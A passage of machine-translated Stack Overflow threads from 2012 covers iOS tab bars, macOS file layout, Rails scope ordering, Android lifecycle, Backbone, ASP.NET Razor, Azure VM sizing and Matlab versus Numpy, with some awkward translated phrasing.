[self.tabbarController.tabbar setHidden:YES]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:44:58.727

您不能禁用某些页面的标签栏，但不能禁用其他页面。您可以做的是在标签栏上绘制一个工具栏。

```
AppDelegate *delegate = (AppDelegate *)[[UIApplication sharedApplication] delegate];
UIToolbar * tb = [[UIToolbar alloc] init];
tb.frame = CGRectMake(0, delegate.window.frame.size.height-44, 320, 44);
[delegate.window addSubview:tb]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:41:45.017

是的，只需将工具栏的 hidden 属性设置为 NO after `[self.tabBarController.tabBar setHidden:YES]`;

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-07T07:18:29.163

首先，您需要在 appdelegate.m 文件中创建一个标签栏，然后只有您可以隐藏工具栏。或者您可以通过此代码单独创建一个工具栏

```
UIToolbar *toolbar = [[UIToolbar alloc] init];
toolbar.frame = CGRectMake(0, 418, 320, 44);

[self.view addSubview:toolbar];
[toolbar release]; 
```

# macos - 在 Mac OS X 上存储代码和安装应用程序的位置 - 从 Windows 切换

> ID：12009733
> 
> 赞同：8
> 
> 时间：2012-08-17T16:37:43.623
> 
> 标签：macos, github, filesystems

这是一个在 Windows 上花了 15 年以上编码但在 Mac OS X 上从头开始的人的一些新手问题。我已经搜索了网络和这个网站，但没有找到答案，但我认为这些答案对很多人都有用的人。

很简单....

1.  我应该在文件系统中的哪里存储私有代码和项目？我的用户目录？在 /usr/?

2.  我应该在哪里存储共享代码和项目？

3.  我应该在哪里设置 github 存储库？

4.  一旦建成，我应该在哪里安装应用程序？我在这里看到了很多可能性。/opt/、/var/lib、/usr/local/var 等。

5.  也许最有趣的是：我怎样才能简单地了解已安装在我的 Mac 上的所有内容的位置？

我可以想象，在 40 年的 UNIX 历史中，已经出现了一些针对这些标准的标准，但到目前为止我还没有找到它们。必须有一些我应该遵循的“最佳实践”指南。

哦，顺便说一句，我说的是 PostgreSQL 之类的东西。不正确的 Mac 应用程序。

我问的原因是我遇到了多种安装方法，这些方法似乎对在哪里安装相同的应用程序有自己的想法。例如 homebrew、ant 等。这些有时会导致与手动安装应用程序的常见问题解答或文档不同的安装位置。

感谢有关这些的任何答案。

非常感谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T16:55:31.030

Github 有一个非常不错的 Mac 应用程序，可以下载和同步你的 Github 存储库。默认情况下，它将它们放在 ~/Documents （您的主文件夹的文档目录）内的子目录中。

我的家庭设置是在 ~ 内部创建一个 git 目录，并将其用于私人项目。对于共享项目，将它们放在 /Users/Shared 中（Mac OS 中每个人都有一个公共共享文件夹）

至于安装命令行工具，Mac 就像 BSD 盒子。安装在 /usr/local/bin 等中。图形应用程序应该放在 /Applications 中。Github 的 mac 应用在 /usr/local/bin 中安装了一个命令行工具（可选）。

OS X 上的一些软件包工具会创建自己的目录层次结构（fink、macports），但 mirports 安装在 /usr/local 中。

# ruby-on-rails-3 - 使用 except 的范围不起作用 Rails

> ID：12009736
> 
> 赞同：4
> 
> 时间：2012-08-17T16:37:52.587
> 
> 标签：ruby-on-rails-3, scope, except

我写了嗨，但SO不会让它，所以我写更长的句子:)顺便说一句嗨。

看起来我的范围不起作用。

我写了那个范围：

`scope :ordered, ->(field, order) { except(:order).order("#{field} #{order}") }`

但它在检查 SQL 时返回以下内容：

```
irb >p.levels.ordered("name", "ASC").to_sql
=> "SELECT \"levels\".* FROM \"levels\" WHERE (\"levels\".pie_id = 6 AND (\"levels\".\"parent_id\" = 0)) ORDER BY position ASC, name ASC" 
```

注意：`position ASC`不应该在那里

但是在我的范围之前添加时它可以工作......

```
irb > p.levels.except(:order).ordered("name", "ASC").to_sql
 => "SELECT \"levels\".* FROM \"levels\" WHERE (\"levels\".pie_id = 6 AND (\"levels\".\"parent_id\" = 0)) ORDER BY name ASC" ` 
```

除了在范围内可用吗？或者你有什么可以帮助我的吗？

红宝石 1.9.2p290

导轨 3.0.14

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T21:10:57.057

您可能已经想到可以通过使用`reorder`. 所以这是我关于为什么`reorder`有效和`except`无效的理论。

重要的是，像`order`, `where`,之类的方法`except`由 , 的实例处理`ActiveRecord::Relation`，而范围（例如`ordered`来自您的示例）则由 的实例委托`ActiveRecord::Relation`给您的模型类。

`some_relation.order(:x)`方法只是返回添加到其列表中的`some_relation`新副本。同样，将返回with empty的副本。只要调用链包含这样的关系方法，就可以按我们的预期工作。`:x``order_values``some_relation.except(:order)``some_relation``order_values``except`

对作用域方法的调用，当作用域实现为 lambda 返回关系时，最终会合`scoped`并由 lambda 返回的关系返回的模型关系：

```
scopes[name] = lambda do |*args|
  options = scope_options.is_a?(Proc) ? scope_options.call(*args) : scope_options

  relation = if options.is_a?(Hash)
    scoped.apply_finder_options(options)
  elsif options
    scoped.merge(options) # <- here options is what returned by your :ordered lambda
  else
    scoped
  end

  extension ? relation.extending(extension) : relation
end 
```

如果仅对要合并的关系之一执行此操作，这`merge`并不能保留效果。`except`如果我们合并`a`and `b`, and`b`没有设置顺序，但是`a`有，结果仍然有顺序。现在`reorder`用一个技巧来解决它：它`reorder_flag`在关系上设置特殊标志来控制如何`merge`进行`order_values`。

这是我的测试样本。我`default_scope`用来将订单注入`Product#scoped`. `Level#scoped`在您的示例中，订单可能通过关联 in注入`Pie`，看起来像`has_many :levels, :order => 'position'`.

```
class Product < ActiveRecord::Base
  default_scope order('id DESC')
  scope :random_order, lambda {
    r = order('random()')
    puts "from lambda: " + r.order_values.inspect
    r
  }
end

# in console:

>> Product.scoped.order_values
=> ["id DESC"]

>> Product.random_order.order_values
from lambda: ["id DESC", "random()"]
=> ["id DESC", "id DESC", "random()"]

# now if I change the first line of lambda to
# r = except(:order).order('random()')

>> Product.random_order.order_values
from lambda: ["random()"]
=> ["id DESC", "random()"] 
```

如您所见，由于`Product.scoped`具有`id DESC`顺序，尽管它已从范围返回的关系中清除，但它仍出现在结果中。

以下是相关来源的链接列表：

*   [关系的 order 和 reorder 方法](https://github.com/rails/rails/blob/v3.0.14/activerecord/lib/active_record/relation/query_methods.rb#L50)
*   [关系的 except 方法](https://github.com/rails/rails/blob/v3.0.14/activerecord/lib/active_record/relation/spawn_methods.rb#L75)
*   [关系的合并方法](https://github.com/rails/rails/blob/v3.0.14/activerecord/lib/active_record/relation/spawn_methods.rb#L5)，注意如何`reorder_flag`在第 29 行使用
*   [范围法](https://github.com/rails/rails/blob/v3.0.14/activerecord/lib/active_record/named_scope.rb#L100)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T07:48:11.103

添加了您在模型中定义的范围

```
scope :ordered, ->(field, order) { except(:order).order("#{field} #{order}") } 
```

尝试了不同的组合和所有的工作

```
a.inspection_serial_numbers.ordered('part_serial_number', 'DESC').except(:order).ordered('id', 'DESC').to_sql

=> "SELECT `inspection_serial_numbers`.* FROM `inspection_serial_numbers` WHERE  `inspection_serial_numbers`.`inspection_master_id` = 1 ORDER BY id DESC" 

a.inspection_serial_numbers.ordered('part_serial_number', 'DESC').except(:order).ordered('id', 'DESC').except(:order).ordered('is_active', 'ASC').to_sql

=> "SELECT `inspection_serial_numbers`.* FROM `inspection_serial_numbers`  WHERE `inspection_serial_numbers`.`inspection_master_id` = 1 ORDER BY is_active ASC" 
```

即使您多次将“有序”范围与“除外”组合多次，最后一个“有序”范围也用于排序

```
a.inspection_serial_numbers.ordered('part_serial_number', 'DESC').ordered('id', 'ASC').except(:order).ordered('id', 'DESC').to_sql

=> "SELECT `inspection_serial_numbers`.* FROM `inspection_serial_numbers`  WHERE `inspection_serial_numbers`.`inspection_master_id` = 1 ORDER BY id DESC" 
```

如果你想删除所有范围，请使用'unscoped'

```
a.inspection_serial_numbers.ordered('id', 'ASC').unscoped.ordered('part_serial_number', 'DESC').to_sql

=> "SELECT \"inspection_serial_numbers\".* FROM \"inspection_serial_numbers\"  ORDER BY part_serial_number DESC" 
```

请参阅 [http://apidock.com/rails/ActiveRecord/SpawnMethods/except](http://apidock.com/rails/ActiveRecord/SpawnMethods/except) 和 [http://apidock.com/rails/ActiveRecord/Base/unscoped/class](http://apidock.com/rails/ActiveRecord/Base/unscoped/class)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-19T13:51:59.977

方法的顺序可能是错误的。

应该写`order("#{field} #{order}").except(:order)`

见[导轨指南](http://guides.rubyonrails.org/active_record_querying.html#except)

# android - Android 应用程序，在 10 - 15 分钟后再次调用 onCreate。为什么？

> ID：12009737
> 
> 赞同：0
> 
> 时间：2012-08-17T16:37:53.363
> 
> 标签：android, cordova, oncreate

我在 Android 上有一个带有 PhoneGap 的应用程序。当我打开应用程序时，称为 OnCreate。当我离开应用程序时，让它在后台运行，10 到 15 分钟后，再次打开并进入名为 OnCreate 的应用程序。

并更改配置方向。

帮助，谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:54:36.867

[Android 开发者文档](http://developer.android.com/reference/android/app/Activity.html)提到了处于“可杀死”状态的应用程序。尽管 Android 尝试在应用程序退出后（即之后`onDestroy`）保持其进程常驻，但它确实需要能够在资源不足的情况下终止这些进程以回收内存。 **应用程序可终止的状态因操作系统版本而异**。在所有版本的 Android 上，已返回`onStop`或`onDestroy`可静默杀死的应用程序。在 Honeycomb 之前的 Android 版本上，从`onPause`也是可以杀死的。简单可杀意味着 Android 保留随时终止应用程序进程的权利，甚至无需运行应用程序代码的另一条指令。换句话说，如果您有任何必须可恢复的状态（例如玩家的游戏进度、物品、奖励等），您必须在进入可杀死状态之前的最后一次回调之前将它们保存到持久存储中。

此外，虽然应用程序可以运行本机线程，即使它们处于可终止状态甚至后置状态`onDestroy`，但应避免这种情况，因为进程终止也会终止这些线程。这可能会导致各种损坏和关机问题。

[资源](http://developer.download.nvidia.com/assets/mobile/files/AndroidLifecycleAppNote_v100.pdf)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:41:52.583

Android会根据后台应用程序的需要回收内存，因此它会破坏您的应用程序，当您重新打开它时，它会重新启动`onCreate`调用。

# backbone.js - 创建主干插件

> ID：12009739
> 
> 赞同：4
> 
> 时间：2012-08-17T16:38:02.990
> 
> 标签：backbone.js, javascript, javascript-framework, marionette

试图创建一个“继承”`Backbone.Model`但覆盖该`sync`方法的主干“插件”。

这是我到目前为止所拥有的：

```
Backbone.New_Plugin = {};
Backbone.New_Plugin.Model = Object.create(Backbone.Model);
Backbone.New_Plugin.Model.sync = function(method, model, options){
    alert('Body of sync method');
} 
```

方法：`Object.create()`直接取自本书***Javascript: The Good Parts***：

```
Object.create = function(o){
    var F = function(){};
    F.prototype = o;
    return new F();
}; 
```

尝试使用新模型时出现错误：

```
var NewModel = Backbone.New_Plugin.Model.extend({});
// Error occurs inside backbone when this line is executed attempting to create a
//   'Model' instance using the new plugin:
var newModelInstance = new NewModel({_pk: 'primary_key'}); 
```

错误出现在Backbone 0.9.2开发版的第1392行。函数内部`inherits()`：

```
    Uncaught TypeError: Function.prototype.toString is not generic 。

```

我正在尝试以主干库`Marionette`创建新版本视图的方式创建一个新插件。看起来我误解了应该这样做的方式。

什么是为骨干创建新插件的好方法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T16:55:50.877

你扩展的方式`Backbone.Model`不是你想要的方式。如果你想创建一种新类型的模型，只需使用`extend`：

```
Backbone.New_Plugin.Model = Backbone.Model.extend({
    sync: function(method, model, options){
        alert('Body of sync method');
    }
});

var newModel = Backbone.New_Plugin.Model.extend({
    // custom properties here
});

var newModelInstance = new newModel({_pk: 'primary_key'}); 
```

另一方面，Crockford 的`Object.create`polyfill 被认为是过时的，因为（我相信）最近的实现`Object.create`需要多个参数。此外，您使用的特定函数不会遵循本机`Object.create`函数，如果它存在的话，尽管您可能只是省略了`if (typeof Object.create !== 'function')`应该包装该函数的语句。

# oauth - 将 oAuth 添加到具有现有成员资格数据库的现有 ASP.NET MVC 4 站点

> ID：12009742
> 
> 赞同：13
> 
> 时间：2012-08-17T16:38:17.747
> 
> 标签：oauth, asp.net-mvc-4, visual-studio-2012

运行 Visual Studio 2012 - 我查看了新的 oAuth 模板以及它在您首次运行站点时创建的默认数据库。

任何人都知道有关如何将所有这些 oAuth 片段集成到已经在使用 Membership 提供程序/数据库的现有 MVC 4 站点的教程？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-12-21T09:31:08.453

有很多网站讨论编写可以连接到现有数据库的自定义会员提供程序。

例如下面的：

[如何-我-设置-a-membership-provider-in-my-existing-database-using-asp-net-mvc](https://stackoverflow.com/questions/1121741/how-do-i-setup-a-membership-provider-in-my-existing-database-using-asp-net-mvc)

[将 ASP.NET 成员资格提供程序与现有用户数据库一起使用](https://stackoverflow.com/questions/7197337/using-asp-net-membership-provider-with-an-existing-user-database)

[如何使用 ASP.NET MVC 在现有数据库中设置成员资格提供程序？](https://stackoverflow.com/questions/1121741/how-do-i-setup-a-membership-provider-in-my-existing-database-using-asp-net-mvc)

希望这些链接有帮助。

# .net - 如何在 html 助手生成的表单中使用 html（使用 razor 语法）？

> ID：12009750
> 
> 赞同：1
> 
> 时间：2012-08-17T16:38:55.043
> 
> 标签：.net, asp.net-mvc-3, c#-to-vb.net

我是一个 ASP.NET MVC 3 的菜鸟，通过[wrox 书](http://www.wrox.com/WileyCDA/WroxTitle/productCd-1118076583.html)学习——但是因为我在 VB 商店工作，所以将代码翻译成 VB。

我正在尝试将此 C# 代码转换为 VB 以生成视图：

```
@using (Html.BeginForm(“Search”, “Home”, FormMethod.Get)) {
    <input type=”text” name=”q” />
    <input type=”submit” value=”Search” />
} 
```

仅替换大括号似乎是一个相当简单的情况，但是我从编译器中得到以下错误并且无法弄清楚原因。

```
@Using (Html.BeginForm("Search", "Home", FormMethod.Get))
      <input type="text" name="q" />            //   '>' expected.  
      <input type="submit" value="Search"/>     //   '>' expected.  
End Using 
```

我确定这是一个简单的 sytnax 问题，但我还不知道语法。我也在尝试理解 HTML 助手和剃刀，所以有很多新东西。谁能解释一下！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:55:27.333

您需要在代码块内标记 html 标记的开头，例如 inside `Using`with`@`或 with `<text>`。

`@`用于单行：

```
@Using (Html.BeginForm("Search", "Home", FormMethod.Get))
      @<input type="text" name="q" /> 
      @<input type="submit" value="Search"/>
End Using 
```

`<text>`用于多行：

```
@Using (Html.BeginForm("Search", "Home", FormMethod.Get))
      @<text>
          <input type="text" name="q" />           
          <input type="submit" value="Search"/>    
      </text>
End Using 
```

有关详细信息，请参阅：[在代码块中组合文本、标记和代码](http://www.asp.net/web-pages/tutorials/basics/asp-net-web-pages-visual-basic#BM_CombiningTextMarkupAndCode)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:44:36.843

使用以下

```
@Code 

End Code 
```

最后还看到这个你有一个组合的例子 [http://www.asp.net/web-pages/tutorials/basics/asp-net-web-pages-visual-basic](http://www.asp.net/web-pages/tutorials/basics/asp-net-web-pages-visual-basic)

# php - 无法将 JSON 数组与 JavaScript 数组进行比较

> ID：12009751
> 
> 赞同：-1
> 
> 时间：2012-08-17T16:38:59.250
> 
> 标签：php, javascript, jquery, json

好的，所以我有一个 JSON 对象，我将它作为参数发送到 test() 函数。见下文：

```
<script type="text/javascript">
$('#getdata').click(function(){

    $.ajax({                                      
    url: '<?php echo base_url().'jqueryDB/jquery';?>',                  //the script to call to get data    
    type:'POST',      
    data: "",                        //you can insert url argumnets here to pass to api.php for example "id=5&parent=6"
    dataType: 'json',                //data format      
    success: function(output_string){
                    $("#result_table").append(output_string);
                    test(output_string);
    }
  });

}); 
</script> 
```

我的测试功能如下所示：（**评论部分解释更多**）

```
<script id="template-download" type="text/x-tmpl">
    window.output = [];  // global array
    function test(arg){
    output = arg;

    {% for (var i=0, file; file=o.files[i]; i++) { %}
        <tr class="template-download fade">
            {% if (file.error) { %}
                <td></td>
                <td class="name"><span>{%=file.name%}</span></td>
                <td class="size"><span>{%=o.formatFileSize(file.size)%}</span></td>
                <td class="error" colspan="2"><span class="label label-important">{%=locale.fileupload.error%}</span> {%=locale.fileupload.errors[file.error] || file.error%}</td>

      // This is where I am having problems. I specify index zero for output and sooner or
     // later file.name should match, but it never does and I'm not sure why??
    // So then I do else if ( "5.jpg" == file.name ) and it does work....As you can
   // see that I test it in the line right below the else if, and it displays the same as file.name.

            {% } else if ( output[0].localeCompare( file.name ) ) { %}
                    <td class="name">{%=String(output[0])%}{%=String(file.name)%}</td>
                    <td class="preview">{% if (file.thumbnail_url) { %}
                        <a href="{%=file.url%}" title="{%=file.name%}" rel="gallery" download="{%=file.name%}"><img src="{%=file.thumbnail_url%}"></a>
                    {% } %}</td>
                    <td class="name">
                        <a href="{%=file.url%}" title="{%=file.name%}" rel="{%=file.thumbnail_url&&'gallery'%}" download="{%=file.name%}">{%=file.name%}</a>
                    </td>
                    <td class="size"><span>{%=o.formatFileSize(file.size)%}</span></td>
                    <td colspan="2"></td>
                {% } %}
                    <td class="delete">
                        <button class="btn btn-danger" data-type="{%=file.delete_type%}" data-url="{%=file.delete_url%}">
                        <i class="icon-trash icon-white"></i>
                        <span>{%=locale.fileupload.destroy%}</span>
                        </button>
                        <input type="checkbox" name="delete" value="1">
                    </td>
        </tr>
        }
    {% } %}
} 
```

谁能看到我在比较中哪里出错了？当我这样做时`else if ( output[0].localeCompare( "5.jpg" ) ) { %}`，它也不起作用。因此，即使我测试时屏幕上的输出显示为 5.jpg，JSON 对象也不允许我将其与自身以外的其他事物进行比较。我确实将它与它本身进行了比较，当然它有效；）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T19:04:22.387

这些是不同的陈述：

```
if ("5.jpg" == file.name)

if ("5.jpg".localeCompare(file.name)) 
```

如果两个字符串相同，则返回第一个比较并运行语句 `true`体。如果两个字符串相同，则将返回零，这在语句的上下文中与. 你可能想要`if`[`localeCompare`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/localeCompare)`if``false`

```
{% } else if (output[0].localeCompare(file.name) == 0) { %} 
```

# c# - 使用 c# 和 HttpWebRequest 发布打开图形操作

> ID：12009752
> 
> 赞同：0
> 
> 时间：2012-08-17T16:39:17.243
> 
> 标签：c#, facebook, httpwebrequest

大家好，我正在尝试使用 HttpWebRequest 方法将打开的图形操作发布到 facebook。

这是我的请求方法

```
public static string RequestUrl(string action, String HTTPMETHOD, dynamic postdata = null)
    {
        string results = "";

        try
        {
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(action);
            if (HTTPMETHOD == "GET")
            {
                req.Method = WebRequestMethods.Http.Get;
            }
            else if (HTTPMETHOD == "POST")
            {
                ASCIIEncoding encoding = new ASCIIEncoding();
                req.Method = WebRequestMethods.Http.Post;
                byte[] data = encoding.GetBytes(postdata.sneaqer);
                req.ContentLength = data.Length;
                req.ContentType = "application/x-www-form-urlencoded";
                Stream newStream = req.GetRequestStream();
                newStream.Write(data, 0, data.Length);
                newStream.Close();
            }
            else if (HTTPMETHOD == "DELETE")
            {
                req.Method = "DELETE";
                ASCIIEncoding encoding = new ASCIIEncoding();
            }
            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
            StreamReader sr = new StreamReader(resp.GetResponseStream());
            results = sr.ReadToEnd();
            sr.Close();
        }
        catch (Exception ex)
        {
            Error.Log("ERROR: Common.cs requestUrl() " + ex.Message + " " + action);
        }

        return results;
    } 
```

这是我迄今为止尝试过的

```
var url = "https://graph.facebook.com/" + personFacebookUserId + "/verbNamespace:follow";
    dynamic parameters = new System.Dynamic.ExpandoObject();
    parameters.person = "http:" + Configuration.getConfigValue("SiteUrl") + "OG/OpenGraphAction.aspx?type=follow&facebookProfilePicture=" + friendFacebookUserId;
    string result = Common.RequestUrl(url, "POST", parameters); 
```

我得到一个错误服务器返回了一个错误的请求。我认为问题在于我传递参数的方式。人是对象，跟随是行动。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-11T06:11:14.847

我发现这篇文章非常有用[Using ASP.Net with Facebook's Graph API and OAuth 2.0 Authentication](http://osnapz.wordpress.com/2010/04/23/using-asp-net-with-facebooks-graph-api-and-oauth-2-0-authentication/)似乎您必须通过将它们重定向到您的一个页面来获取身份验证令牌。

# java - 动作只执行一次？

> ID：12009757
> 
> 赞同：0
> 
> 时间：2012-08-17T16:39:33.567
> 
> 标签：java, richfaces, jsf-1.2, jboss-4.0.x

我有以下代码工作，目标很简单：执行动作，然后打开模态面板，它正在工作，但动作只执行一次，之后打开模态面板而不执行动作。

```
<h:form>
  <ui:repeat id="al11" var="albumslistvalue1" 
  value="#{AlbumDetailBean.getAlbumImagesList()}">
    <a4j:commandLink id="link" action="#{AlbumDetailBean.mudaIdatual()}" 
    reRender="link, panel" 
    oncomplete="javascript:#{rich:component('panel')}.show();">
      <f:param value="#{albumslistvalue1.id}" name="idfotoatual"/>
      <h:graphicImage id="image" 
      url="#{albumslistvalue1.albumimagename}"/>
    </a4j:commandLink>
  </ui:repeat>
</h:form> 
```

我坚持了很长时间，关于我做错了什么或可能忘记的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:53:53.320

造成这种情况的常见原因是因为您的页面上存在一些验证错误，为了让它们全部可用`h:message`并`h:messages`查看是否存在验证错误。

您可以查看此线程以获取详细信息，特别是项目编号 #4。[未调用 Jsf Action](https://stackoverflow.com/questions/2118656/hcommandlink-hcommandbutton-is-not-being-invoked/2120183#2120183)

# visual-studio-2010 - 可以通过服务配置来配置 Azure VM 大小吗？

> ID：12009760
> 
> 赞同：9
> 
> 时间：2012-08-17T16:39:43.677
> 
> 标签：visual-studio-2010, azure

我想在我的 Azure 部署中部署不同的 VM 大小，具体取决于目标云服务（例如，我希望在生产中使用更大的实例，但在测试中可以使用较小的实例）。在 Visual Studio 2010 中，所有服务配置的大小必须相同。

是否有解决方法，或者这就是它的方式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T20:18:35.310

我发现最好的解决方法是拥有两个不同的云项目。所以基本上你只需创建两个不同的云项目，将所有相同的角色添加到每个项目中，但每个项目都有不同的配置。每次更改时，您只需要小心更新这两个地方的所有配置。正如 Brent the Programming Simian 已经提到的那样，这相当于拥有两个 CSDEF，这只是实现这一目标的具体方法。

这也为您提供了其他方面的灵活性。例如，您可以拥有一个同时具有 HTTP 和 HTTPS 端点的测试站点，但生产站点只能具有 HTTPS。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:26:15.180

VM 大小在服务定义文件中声明。所以创建不同大小的云服务包需要不同的包。最终，这不是视觉工作室支持的东西。

除此之外，如果您正在创建云服务 (PaaS)，我会质疑为什么需要这样做。我收到的最佳指导是运行您需要的最小 VM，并根据负载要求运行尽可能多的 VM。通过拥有更多、更小的实例，您的解决方案最终具有更大的弹性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-12-02T17:09:58.150

我进一步评论，但认为我会为我的解决方案提供 powershell。我在构建我的 CI 服务器（恰好是 TeamCity）之前运行它，但这可以在本地或 CI 上运行。

```
Param(
    [string]$RoleType,  #WebRole or WorkerRole
    [string]$RoleName,  #RoleName from CSDEF
    [string]$VMInstanceSizeIn,  #Options for VM Size: Small, Medium, Large, ExtraLarge, A6, A7
    [string]$csDefPath  #File path for ServiceDefinition.csdef for the cloud service project
)

$timeStampFormat = "g"
if ($VMInstanceSizeIn -eq $null) {$VMInstanceSizeIn = "Medium"}

Write-Output "$(Get-Date -f $timeStampFormat) - Setting $RoleType role type with RoleName $RoleName VM Size to $VMInstanceSizeIn in ServiceDefinition.csdef prior to building the package file."

Try 
{
    $csDefConfig = "$csDefPath\ServiceDefinition.csdef"
    Write-Output "$(Get-Date -f $timeStampFormat) - config file location: $csDefConfig"
    $csDefConfigXml = [xml](Get-Content $csDefConfig)
    Write-Output "$(Get-Date -f $timeStampFormat) - Found ServiceDefinition File at $csDefConfig"
    $csDefCurrentXmlNode = $csDefConfigXml.ServiceDefinition.$RoleType | where {$_.Name -eq $RoleName}
    $csDefCurrentXmlNode.SetAttribute("vmsize", $VMInstanceSizeIn)
    $csDefConfigXml.Save($csDefConfig)
    Write-Output "$(Get-Date -f $timeStampFormat) - Successfully saved the ServiceDefinition.csdef file to $csDefConfig"
}

Catch
{
    Write-Output "$(Get-Date -f $timeStampFormat) - Powershell Script Error. An error occurred while attempting to modify the ServiceDefinition.csdef file prior to building the solution."  
    Write-Error -ErrorRecord $_
    ##teamcity[buildStatus status='FAILURE' ]
    exit(1)
} 
```

请注意，在撰写本文时，我只需要处理一个 web 和 worker 角色，所以我不确定是否曾经使用多个 worker 角色进行过测试。至少应该足以让您入门。

# matlab - 如果我已经知道并使用 Numpy/Scipy，我是否应该努力学习 Matlab

> ID：12009762
> 
> 赞同：-3
> 
> 时间：2012-08-17T16:39:52.200
> 
> 标签：matlab, numpy, scipy

我使用并喜欢 Numpy 和 Scipy，但在我参与的一个领域（生物力学研究）中，MATLAB 占据了主导地位。

我相信这种统治很大程度上是由于传统，类似于 Windows 或 Office 发生的情况，但也许有一些内在的理由偏爱一个而不是另一个。

目前我可以用 Numpy/Scipy 解决大部分数据分析问题，但是当我提到它时，我看到了研究人员脸上的尴尬。

真正的问题是：如果我已经知道 Numpy/Scipy，是否真的有必要学习 Matlab？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T17:02:55.610

假设你申请在我的实验室工作。你说“我知道 Numpy/Scipy”。然后我说“太棒了，那么你学习 Matlab 会容易得多”。为什么？因为我们的代码库在 Matlab 中，我们合作者的代码库在 Matlab 中，我不会付钱让你重新发明轮子，我不会付钱让你编写无法轻易集成到其他软件中的代码人的项目。

简而言之：如果一个领域主要使用一种语言，并且您想在该领域工作，那么了解该语言非常有用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T17:46:29.050

正确的答案真的取决于你的情况。

学习 Matlab 以防止在演示过程中出现滑稽面孔**并不是**学习该语言的正确理由。如果有人因为您使用 Python 而不是 Matlab 而不能接受您的结果，那么他们就证明了他们作为科学同行的弱点。他们应该根据数据、结果和对这些结果的解释来判断你的工作。如果你正确地实现了你的模型，那么你用来实现它们的语言应该对结果**没有**影响，如果确实如此，那么你的模型就有问题。

但是，如果您所在领域的工作是协作的，那么学习同行的语言可能会更好。您希望您的同行将您的工作融入他们自己的工作中。可悲的是，他们中的许多人会认为将 Python 翻译成 Matlab 的门槛太高，因此放弃了。

因此，只有您可以决定是否有必要学习 Matlab，尽管它可能是有利的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T17:03:36.527

学习新的编程语言永远不会有坏处。只有学习才能让自己变得更好。所以问题归结为你想努力学习 MatLab。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-17T17:07:03.060

Numpy/Scipy 的优点

*   比 MATLAB 更快，尤其是当您的代码中有非常大的 for 循环（或嵌套的 for 循环）时。虽然 MATLAB 具有高度优化的矩阵操作，但我认为它们也有一个并行化的 for (parfor)
*   自由
*   没有许可问题，因此您可以像运行一千个代码实例一样运行，而不必担心拥有一千个许可。

MATLAB 的优点：

*   MATLAB 有很多非常棒的内置包（例如整个统计工具箱）。
*   MATLAB 非常适合有效地制作漂亮的绘图（如果您知道 Matplotlib，那么忘记这个 Pro）。
*   您所在行业的每个人目前都在使用它。您可以将此归因于人们不愿意学习如何编程，或者某些群体的固执或传统等……但这并不能改变这两件事：（1）您可能会比他们学习 MATLAB 更快地学习python 和（2）如果您能够有效地沟通并成为更广泛的研究人员社区的一部分，您的目标就会更好地实现......是吗？

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-17T21:19:13.860

我使用并喜欢 Numpy/Scipy 和 MATLAB，在我看来它们是互补的，与偶尔的用户通常认为的重叠要少得多。

是的，我认为您确实有必要学习 MATLAB，至少要验证我上面的不合理断言是否正确。

# android - 堆栈跟踪永远不会追溯到应用程序代码

> ID：12009764
> 
> 赞同：2
> 
> 时间：2012-08-17T16:39:57.237
> 
> 标签：android

我不知道为什么，但似乎使用较新版本的 android 我从来没有得到有用的堆栈跟踪。他们似乎没有回到足够远的地方让我找到导致崩溃的代码行。例子：

```
08-17 09:33:38.449: E/AndroidRuntime(14389): FATAL EXCEPTION: main
08-17 09:33:38.449: E/AndroidRuntime(14389): java.lang.RuntimeException: Unable to resume activity {com.evidence/com.evidence.activity.EvidenceList}: android.database.StaleDataException: Attempted to access a cursor after it has been closed.
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2567)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.app.ActivityThread.handleResumeActivity(ActivityThread.java:2595)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1183)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.os.Handler.dispatchMessage(Handler.java:99)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.os.Looper.loop(Looper.java:137)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at android.app.ActivityThread.main(ActivityThread.java:4575)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at java.lang.reflect.Method.invokeNative(Native Method)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at java.lang.reflect.Method.invoke(Method.java:511)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:789)
08-17 09:33:38.449: E/AndroidRuntime(14389):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:556)
